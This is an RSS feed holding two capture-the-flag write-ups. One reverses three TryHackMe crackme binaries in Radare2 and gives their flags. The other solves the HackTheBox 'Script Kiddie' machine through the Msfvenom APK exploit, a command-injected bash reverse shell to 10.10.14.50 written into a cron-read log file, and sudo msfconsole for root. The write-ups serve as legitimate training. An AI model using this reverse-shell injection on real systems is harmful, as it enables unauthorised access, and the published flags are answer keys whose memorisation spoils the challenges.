<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sam Docs – ctf</title><link>/categories/ctf/</link><description>Recent content in ctf on Sam Docs</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Fri, 10 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: Reverse Engineering Writeup</title><link>/docs/capture-the-flag/try-hack-me/reverse-engineering/</link><pubDate>Fri, 10 Mar 2023 00:00:00 +0000</pubDate><guid>/docs/capture-the-flag/try-hack-me/reverse-engineering/</guid><description>
&lt;h3 id="update-march-2023---task-files-and-flags-are-now-provided-below-since-the-reverse-engineering-room-has-become-private-on-tryhackme">Update (March 2023) - &lt;strong>Task files&lt;/strong> and &lt;strong>flags&lt;/strong> are now provided below, since the &lt;strong>Reverse Engineering room&lt;/strong> has become private on TryHackMe.&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">Task File&lt;/th>
&lt;th style="text-align:center">Flag&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">&lt;a href="files/crackme1.bin">crackme1&lt;/a>&lt;/td>
&lt;td style="text-align:center">&lt;code>hax0r&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;a href="files/crackme2.bin">crackme2&lt;/a>&lt;/td>
&lt;td style="text-align:center">&lt;code>4988&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">&lt;a href="files/crackme3.bin">crackme3&lt;/a>&lt;/td>
&lt;td style="text-align:center">&lt;code>azt&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;img src="images/1_begin_photo.png" alt="image">&lt;/p>
&lt;p>&lt;strong>Hello and welcome!&lt;/strong>&lt;/p>
&lt;p>Before we begin, a quick heads up that we will be reversing mainly on &lt;a href="https://github.com/radareorg/radare2#installation">&lt;strong>Radare2&lt;/strong>&lt;/a>, so get yours ready if you haven’t already had one! Otherwise, feel free to use any disassemblers of your choice!&lt;/p>
&lt;p>Here’s the link to the &lt;a href="https://tryhackme.com/room/reverseengineering">&lt;strong>Reverse Engineering room&lt;/strong>&lt;/a> on Try Hack Me, which is what we’ll be focusing on later on. Also, consider starting with the much more beginner friendly &lt;a href="https://tryhackme.com/room/reverselfiles">&lt;strong>Reversing ELF room&lt;/strong>&lt;/a> if you’re new to reversing!&lt;/p>
&lt;p>&lt;strong>With that said, let’s begin!&lt;/strong>&lt;/p>
&lt;hr>
&lt;h2 id="crackme1">&lt;strong>Crackme1&lt;/strong>&lt;/h2>
&lt;blockquote>
&lt;p>&lt;em>This first crackme file will give you an introduction to if statements and basic function calling in assembly.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="images/2_crackme1_execute_test.png" alt="image">&lt;/p>
&lt;p>With &lt;code>test&lt;/code> provided to the password prompt, the binary returns a string of &lt;code>password is incorrect&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/3_disassembling_crackme1.png" alt="image">&lt;/p>
&lt;p>Disassembling &lt;code>crackme1.bin&lt;/code> with Radare2.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/4_crackme1_aaa.png" alt="image">&lt;/p>
&lt;p>Running &lt;code>aaa&lt;/code> command to analyze all functions within the binary.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/5_crackme1_afll.png" alt="image">&lt;/p>
&lt;p>&lt;code>afll&lt;/code> to list out details of all functions. We’ll first start with disassembling of the &lt;code>main&lt;/code> function.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/6_crackme1_pdf_main.png" alt="image">&lt;/p>
&lt;p>&lt;code>pdf @main&lt;/code> to disassemble the main function. By this point you should be able to spot the flag pretty easily already.&lt;/p>
&lt;p>Now that we’ve obtained the flag, let’s try diving a little deeper and get a better understanding of those assembly instructions!&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/7_crackme1_pdf_main_detailed.png" alt="image">&lt;/p>
&lt;p>From what we could observe, there seems to be &lt;strong>8 important segments of code&lt;/strong>. Their explanations are as following:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Print &lt;code>enter password&lt;/code> string.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Store the flag into &lt;code>var_14h&lt;/code>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Load the address of &lt;code>var_eh&lt;/code> into &lt;code>rax&lt;/code>, then copies it to &lt;code>rsi&lt;/code>, such that &lt;code>rsi&lt;/code> would have the address of &lt;code>var_eh&lt;/code>. Also load an address in the memory which contains &lt;code>%s&lt;/code> into &lt;code>rdi&lt;/code>.&lt;br>&lt;/p>
&lt;p>These two arguments, &lt;code>rsi&lt;/code> and &lt;code>rdi&lt;/code> will be used as parameters for the calling of &lt;code>scanf()&lt;/code> in &lt;strong>4th segment&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Calling of &lt;code>scanf()&lt;/code>.&lt;/p>
&lt;ul>
&lt;li>&lt;code>rdi&lt;/code> which holds &lt;code>%s&lt;/code>, tells &lt;code>scanf()&lt;/code> it should expect a string input.&lt;/li>
&lt;li>&lt;code>rsi&lt;/code> which holds memory address of &lt;code>var_eh&lt;/code>, tells &lt;code>scanf()&lt;/code> where to store the string input.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Consist of the following operations.&lt;/p>
&lt;ol>
&lt;li>Load the address of &lt;code>var_14h&lt;/code> into &lt;code>rdx&lt;/code>, then copies it to &lt;code>rsi&lt;/code>.&lt;/li>
&lt;li>Load the address of &lt;code>var_eh&lt;/code> into &lt;code>rax&lt;/code>, then copies it to &lt;code>rdi&lt;/code>.&lt;/li>
&lt;li>In a sense, &lt;code>rsi&lt;/code> would contain address of &lt;strong>the flag&lt;/strong>, &lt;code>rdi&lt;/code> would contain address of &lt;strong>our string input&lt;/strong>. They will be used as parameters for calling of &lt;code>strcmp()&lt;/code>.&lt;/li>
&lt;li>&lt;code>eax&lt;/code> will be used to store the return value of &lt;code>strcmp()&lt;/code>.
&lt;ul>
&lt;li>&lt;code>0&lt;/code> is returned by &lt;code>strcmp()&lt;/code> if both strings are &lt;strong>equal&lt;/strong>.&lt;/li>
&lt;li>&lt;code>Non-zero value&lt;/code> is returned by &lt;code>strcmp()&lt;/code> if both strings are &lt;strong>not equal&lt;/strong>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>
&lt;p>Copy &lt;code>eax&lt;/code> to &lt;code>var_18h&lt;/code>, then compare it against &lt;code>0&lt;/code>.&lt;br>&lt;/p>
&lt;p>Jump to &lt;strong>8th segment&lt;/strong> if they aren’t equal, otherwise proceed to &lt;strong>7th segment&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Print &lt;code>password is correct&lt;/code>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Print &lt;code>password is incorrect&lt;/code>.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>Feel free to take a moment to digest/understand all these steps!&lt;/strong>&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/8_crackme1_flag_verification.png" alt="image">&lt;/p>
&lt;p>Flag verification.&lt;/p>
&lt;hr>
&lt;h2 id="crackme2">&lt;strong>Crackme2&lt;/strong>&lt;/h2>
&lt;blockquote>
&lt;p>&lt;em>This is the second crackme file — Unlike the first file, this will involve examining registers, how and where values are compared&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="images/9_crackme2_run.png" alt="image">&lt;/p>
&lt;p>Nothing too special, this is done mostly to observe how the strings correlates with behavior of the binary.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/10_crackme2_r2d.png" alt="image">&lt;/p>
&lt;p>Disassembling &lt;code>crackme2.bin&lt;/code> with Radare2.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/11_crackme2_aaa.png" alt="image">&lt;/p>
&lt;p>&lt;code>aaa&lt;/code> to analyze all functions within the binary.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/12_crackme2_afll.png" alt="image">&lt;/p>
&lt;p>&lt;code>afll&lt;/code> to list out details of all functions. Again, we’ll first start with disassembling of the &lt;code>main&lt;/code> function.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/13_crackme2_pdf_main.png" alt="image">&lt;/p>
&lt;p>Unlike the previous crackme, there seems to be no obvious sign of flags in this one. But one thing for sure, we are trying to get the code in the &lt;strong>5th segment&lt;/strong> to execute. So, let’s begin with another round of analysis.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Print &lt;code>enter your password&lt;/code> string.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Load the address of &lt;code>var_ch&lt;/code> into &lt;code>rax&lt;/code>, then copies it to &lt;code>rsi&lt;/code>, such that &lt;code>rsi&lt;/code> would have the address of &lt;code>var_ch&lt;/code>.&lt;br>
Also loads an address in the memory which holds &lt;code>%d&lt;/code> into &lt;code>rdi&lt;/code>.&lt;br>&lt;/p>
&lt;p>These two arguments, &lt;code>rsi&lt;/code> and &lt;code>rdi&lt;/code> will be used as parameters for the calling of &lt;code>scanf()&lt;/code> in &lt;strong>3rd segment&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Calling of &lt;code>scanf()&lt;/code>.&lt;/p>
&lt;ul>
&lt;li>&lt;code>rdi&lt;/code> which holds &lt;code>%d&lt;/code> tells &lt;code>scanf()&lt;/code> it should expect a decimal integer input&lt;/li>
&lt;li>&lt;code>rsi&lt;/code> which holds memory address of &lt;code>var_ch&lt;/code> tells &lt;code>scanf()&lt;/code> where to store the string input.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Copy the value of &lt;code>var_ch&lt;/code> &lt;em>(our decimal integer input!)&lt;/em> to &lt;code>eax&lt;/code>, then compare it against &lt;strong>a hex value&lt;/strong>.&lt;br>
Jump to &lt;strong>6th segment&lt;/strong> if they aren’t equal, otherwise proceed to &lt;strong>5th segment&lt;/strong>.&lt;br>&lt;/p>
&lt;p>&lt;em>&lt;strong>As such, the hex value should be our flag!&lt;/strong>&lt;/em>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Print &lt;code>password is valid&lt;/code>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Print &lt;code>password is incorrect&lt;/code>.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Overall, the assembly code of crackme2 is more straight-forward in comparison to crackme1.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/14_crackme2_flag_verification.png" alt="image">&lt;/p>
&lt;p>Flag verification.&lt;/p>
&lt;hr>
&lt;h2 id="crackme3">&lt;strong>Crackme3&lt;/strong>&lt;/h2>
&lt;blockquote>
&lt;p>&lt;em>This crackme will be significantly more challenging — it involves learning how loops work, and how they are represented in assembly&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>Unlike the previous ones, the third challenge will require us to carry over what we’ve learned earlier, and observe how they are incorporated into loops.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/15_crackme3_run.png" alt="image">&lt;/p>
&lt;p>Cool, got our good old &lt;code>password is incorrect&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/16_crackme3_r2d.png" alt="image">&lt;/p>
&lt;p>Disassembling &lt;code>crackme3.bin&lt;/code> with Radare2.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/17_crackme3_aaa.png" alt="image">&lt;/p>
&lt;p>&lt;code>aaa&lt;/code> to analyze all functions within the binary.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/18_crackme3_afll.png" alt="image">&lt;/p>
&lt;p>&lt;code>afll&lt;/code> to list out details of all functions. Let’s start disassembling the &lt;code>main&lt;/code> function.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/19_crackme3_pdf_main.png" alt="image">&lt;/p>
&lt;p>Looks like we’ve got something interesting going on in the middle. Let’s switch over to graph view to get a better view.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/20_crackme3_sf_main_VV.png" alt="image">&lt;/p>
&lt;ul>
&lt;li>&lt;code>sf main&lt;/code> to seek to address of main function.&lt;br>&lt;/li>
&lt;li>&lt;code>VV&lt;/code> to switch to visual mode and view graphs.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>&lt;img src="images/21_crackme3_VV_big.png" alt="image">&lt;/p>
&lt;p>Some rough explanations:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Takes in our input, also initiates the loop counter to &lt;code>0&lt;/code>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Condition check for the loop, goes to &lt;strong>3rd segment&lt;/strong> &lt;em>(flag checking)&lt;/em> if the loop counter is less than or equal to &lt;code>2&lt;/code>, otherwise proceed to &lt;strong>5th segment&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Flag checking operation, compares our input one character at a time against the flag.&lt;br>&lt;/p>
&lt;p>Goes to &lt;strong>4th segment&lt;/strong> &lt;em>(counter increment)&lt;/em> if they match, otherwise proceed to &lt;strong>6th segment&lt;/strong>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Increment loop counter by &lt;code>1&lt;/code>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Print &lt;code>password is correct&lt;/code>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Print &lt;code>password is incorrect&lt;/code>.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>Thus, our goal is to figure out the input needed for crackme3 to execute in the following order!&lt;/strong>&lt;br>
&lt;code>1234 → 234 → 234 → 25&lt;/code>&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/22_crackme3_VV_big_cmp.png" alt="images">&lt;/p>
&lt;p>There are lots of methods to go about obtaining the flag, but the easiest way should be observing &lt;strong>how our input affects the highlighted instruction&lt;/strong> in the figure above, as it directly decides if the loop counter should be incremented &lt;em>(which we obviously want it to)&lt;/em>.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/23_crackme3_db.png" alt="image">&lt;/p>
&lt;p>Press &lt;code>q&lt;/code> 2 times to return to CLI interface.&lt;br>
&lt;code>db 0x561331e0077c&lt;/code> to set breakpoint at the specified instruction.&lt;/p>
&lt;p>We’ll try to observe how our input values affect those two registers - &lt;code>dl&lt;/code>, &lt;code>al&lt;/code>&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/24_crackme3_a.png" alt="image">&lt;/p>
&lt;ol>
&lt;li>&lt;code>dc&lt;/code> to start start/continue execution.&lt;/li>
&lt;li>We’ll provide an input of &lt;code>ABCD&lt;/code> &lt;em>(0x41, 0x42, 0x43, 0x44)&lt;/em>, just because they are easier to spot in the memory.&lt;/li>
&lt;li>&lt;code>dr&lt;/code> to show value stored in registers. As a side note, &lt;code>dl&lt;/code> is the lowest 8 bit of &lt;code>rdx&lt;/code>, &lt;code>al&lt;/code> is the lowest 8 bit of &lt;code>rax&lt;/code>.&lt;/li>
&lt;/ol>
&lt;p>Interesting&amp;hellip; It seems that &lt;code>rdx&lt;/code> holds the hex value from &lt;strong>the first character (A)&lt;/strong> of our input string. Furthermore, it is being compared against &lt;code>rax&lt;/code>, &lt;code>0x00000061&lt;/code>, which means&amp;hellip;&lt;/p>
&lt;p>&lt;em>&lt;strong>The first character of our flag is an &lt;code>a&lt;/code>!&lt;/strong>&lt;/em>&lt;/p>
&lt;p>Feel free to take a moment to understand how/why it is so.&lt;/p>
&lt;p>Got it? We’ll modify the value of the &lt;code>rdx&lt;/code> register to match &lt;code>rax&lt;/code> before continuing execution, so that the loop doesn’t break.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/25_crackme3_z.png" alt="image">&lt;/p>
&lt;p>Hit our second breakpoint, same concept as before, we’ll modify &lt;code>rdx&lt;/code> register to match &lt;code>rax&lt;/code>, the second character of the flag - &lt;code>z&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/26_crackme3_t.png" alt="image">&lt;/p>
&lt;p>Last character of the flag.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/27_crackme3_flag_verification.png" alt="image">&lt;/p>
&lt;p>&lt;em>&lt;strong>Voila!&lt;/strong>&lt;/em>&lt;/p>
&lt;hr>
&lt;h2 id="afterthoughts">&lt;strong>Afterthoughts&lt;/strong>&lt;/h2>
&lt;p>Overall, the Reverse Engineering room was a decent learning experience for myself on the following concepts of assembly language:&lt;/p>
&lt;ul>
&lt;li>Conditional statements&lt;/li>
&lt;li>Values comparison&lt;/li>
&lt;li>Loops&lt;/li>
&lt;/ul>
&lt;p>I’ve had a good amount of eureka moments throughout these crackmes and they were truly amazing!&lt;/p></description></item><item><title>Docs: Script Kiddie Writeup</title><link>/docs/capture-the-flag/hack-the-box/script-kiddie/</link><pubDate>Mon, 06 Mar 2023 00:00:00 +0000</pubDate><guid>/docs/capture-the-flag/hack-the-box/script-kiddie/</guid><description>
&lt;p>&lt;img src="images/1_script_kiddie.png" alt="image">&lt;/p>
&lt;p>&lt;strong>Script Kiddie!&lt;/strong>&lt;br>
What is the author (0xdf) implying to us?&lt;/p>
&lt;p>A box for script kiddies?&lt;br>
Or is it a box for us to stand out from the script kiddies?&lt;br>
My guess would be the latter…&lt;/p>
&lt;p>Keep in mind, the destination (root.txt) is not what’s important, it’s the journey (every line that got us to root.txt) that counts.&lt;/p>
&lt;p>&lt;strong>With that said, let’s begin!&lt;/strong>&lt;/p>
&lt;hr>
&lt;h2 id="enumeration">&lt;strong>Enumeration&lt;/strong>&lt;/h2>
&lt;p>&lt;img src="images/2_nmap_scan.png" alt="image">&lt;/p>
&lt;p>Nmap scan reveals &lt;code>Werkzeug httpd 0.16.1 (Python 3.8.5)&lt;/code> running on port 5000.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/3_visit_site.png" alt="image">&lt;/p>
&lt;p>Quite a few options are available to play with… Nmap, Msfvenom, Searchsploit…&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/4_werkzeug_metasploit.png" alt="image">&lt;/p>
&lt;p>The Werkzeug module available from Metasploit will spawn a Python shell, provided if we had access to a &lt;strong>Werkzeug debug console&lt;/strong>. But since we don’t, this exploit is unusable for us.&lt;/p>
&lt;hr>
&lt;h2 id="exploitation">&lt;strong>Exploitation&lt;/strong>&lt;/h2>
&lt;p>&lt;img src="images/5_venom_metasploit.png" alt="image">&lt;/p>
&lt;p>The exploit we are using is &lt;code>CVE-2020–7384&lt;/code>, one that leverages the mishandling of apk files by Msfvenom to grant us a reverse shell.&lt;/p>
&lt;p>We&amp;rsquo;ll start by configuring the necessary parameters in Metasploit.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/6_first_netcat_wait.png" alt="image">&lt;/p>
&lt;p>Setting up Netcat listener on port 4444.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/7_upload.png" alt="image">&lt;/p>
&lt;p>With the &lt;code>os&lt;/code> set as Android, &lt;code>lhost&lt;/code> set as some funny ip, we can proceed to upload the APK.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/8_first_success.png" alt="image">&lt;/p>
&lt;p>&lt;em>&lt;strong>Voila!&lt;/strong>&lt;/em> And we’ve got user access to the machine.&lt;/p>
&lt;hr>
&lt;h2 id="privilege-escalation">&lt;strong>Privilege Escalation&lt;/strong>&lt;/h2>
&lt;p>&lt;img src="images/9_scanlosersh.png" alt="image">&lt;/p>
&lt;p>&lt;code>/home/pwn/scanlosers.sh&lt;/code>&lt;/p>
&lt;p>&lt;img src="images/10_hackers.png" alt="image">&lt;/p>
&lt;p>&lt;code>home/kid/logs/hackers&lt;/code>&lt;/p>
&lt;p>There’s an interesting script &lt;code>scanlosers.sh&lt;/code>, within user directory of &lt;code>pwn&lt;/code>, but we (the &lt;code>kid&lt;/code> user) unfortunately only have read access to it.&lt;/p>
&lt;p>That said, since it takes in input from the &lt;code>hackers&lt;/code> file, which we is owned by us (&lt;code>kid&lt;/code>). Thus, &lt;code>scanlosers.sh&lt;/code> is still accessible by us in some ways.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/11_cron_sus.png" alt="image">&lt;/p>
&lt;p>After writing some random stuff into &lt;code>hackers&lt;/code>, but the file seems to remain empty. It brought up suspicion that a cronjob of &lt;code>scanlosers.sh&lt;/code> was running, as the last line of &lt;code>scanlosers.sh&lt;/code> - &lt;code>echo -n &amp;gt; $log&lt;/code> will clear the &lt;code>hackers&lt;/code> file.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/12_echo_hello.png" alt="image">&lt;/p>
&lt;p>First Shell: echoing &lt;code>hello&lt;/code> into &lt;code>hackers&lt;/code>&lt;/p>
&lt;p>&lt;img src="images/13_cron_gottem.png" alt="image">&lt;/p>
&lt;p>Second Shell: running &lt;code>pspy64&lt;/code>, catches the cronjob of our payload &lt;code>hello&lt;/code>&lt;/p>
&lt;p>To confirm our suspicion, we will use &lt;a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64">&lt;strong>pspy&lt;/strong>&lt;/a>, a command line tool designed for snooping on commands run by other users, cron jobs, etc.&lt;/p>
&lt;p>I have downloaded the 64-bit binary version and used &lt;code>nc&lt;/code> to transfer the binary over to the Script Kiddie machine. (feel free to skip this step or try it out for yourself)&lt;/p>
&lt;ol>
&lt;li>Initiate two reverse shells.&lt;/li>
&lt;li>The first shell runs our test payload &lt;code>hello&lt;/code>&lt;/li>
&lt;li>The second shell runs the &lt;code>pspy64&lt;/code> binary, and was able to catch the details of the cronjob.&lt;/li>
&lt;/ol>
&lt;p>Indeed, we are able to confirm a cronjob was running in the background, meaning that &lt;code>/home/pwn/scanlosers.sh&lt;/code> will be executed for each time &lt;code>/home/kid/log/hackers&lt;/code> is being altered.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/14_explanation.png" alt="image">&lt;/p>
&lt;p>Some explanations, our payload is basically a &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp">&lt;strong>Bash TCP Shell&lt;/strong>&lt;/a>. Description for each &lt;em>gate&lt;/em> from &lt;code>scanlosers.sh&lt;/code> are as following:&lt;/p>
&lt;ol>
&lt;li>Remove &lt;code>tuna&lt;/code> and &lt;code>salmon&lt;/code>.&lt;/li>
&lt;li>Sort our payload if it has more than one line, since we don’t, we’re good.&lt;/li>
&lt;li>Stores our payload into the &lt;code>ip&lt;/code> variable.&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;img src="images/15_2nd_scanlosers.png" alt="image">&lt;/p>
&lt;p>When our payload is parsed and executed, they will be run as:&lt;/p>
&lt;ol>
&lt;li>&lt;code>sh -c “nmap --top-ports 10 -oN recon/;&lt;/code>&lt;br>
Doesn&amp;rsquo;t do anything since it is an incomplete nmap command, no ip address is supplied.&lt;/li>
&lt;li>&lt;code>/bin/bash -c ‘bash -i &amp;gt;&amp;amp;/dev/tcp/10.10.14.50/8888 0&amp;gt;&amp;amp;1’&lt;/code>&lt;br>
&lt;em>&lt;strong>The Bash TCP Shell we need!&lt;/strong>&lt;/em>&lt;/li>
&lt;li>&lt;code>#.nmap ${ip} 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null” &amp;amp;...&lt;/code>&lt;br>
Using the &lt;code>#&lt;/code> to comment out everything else&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;img src="images/16_second_shell.png" alt="image">&lt;/p>
&lt;p>Setting up Netcat listener on port 8888.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/17_echo_payload.png" alt="image">&lt;/p>
&lt;p>&lt;em>&lt;strong>Moment of Truth!&lt;/strong>&lt;/em>&lt;/p>
&lt;p>Writing our payload into &lt;code>hackers&lt;/code>.&lt;/p>
&lt;p>&lt;code>echo “tuna salmon ;/bin/bash -c ‘bash -i &amp;gt;&amp;amp;/dev/tcp/10.10.14.50/8888 0&amp;gt;&amp;amp;1’ #” &amp;gt;&amp;gt; hackers&lt;/code>&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/18_got_pwn.png" alt="image">&lt;/p>
&lt;p>After having logged in as &lt;code>pwn&lt;/code>, with &lt;code>sudo -l&lt;/code> we found out that we are able to run &lt;code>msfconsole&lt;/code> as root without the need of password.&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/19_sudo_meta.png" alt="image">&lt;/p>
&lt;p>Now let’s run &lt;code>msfconsole&lt;/code> as sudo.&lt;/p>
&lt;p>&lt;code>sudo /opt/metasploit-framework-6.0.9/msfconsole&lt;/code>&lt;/p>
&lt;hr>
&lt;p>&lt;img src="images/20_root_flag.png" alt="image">&lt;/p>
&lt;p>&lt;em>&lt;strong>Jackpot!&lt;/strong>&lt;/em>&lt;/p>
&lt;p>And there we have it!&lt;/p>
&lt;h2 id="afterthoughts">&lt;strong>Afterthoughts&lt;/strong>&lt;/h2>
&lt;p>Overall, &lt;strong>ScriptKiddie&lt;/strong> teaches the basic yet core concepts of the HTB platform:&lt;/p>
&lt;ul>
&lt;li>Metasploit&lt;/li>
&lt;li>Cronjobs&lt;/li>
&lt;li>Bash scripting&lt;/li>
&lt;li>&lt;code>sudo -l&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>It is one box that should definitely be recommend for the newcomers!&lt;/p></description></item></channel></rss>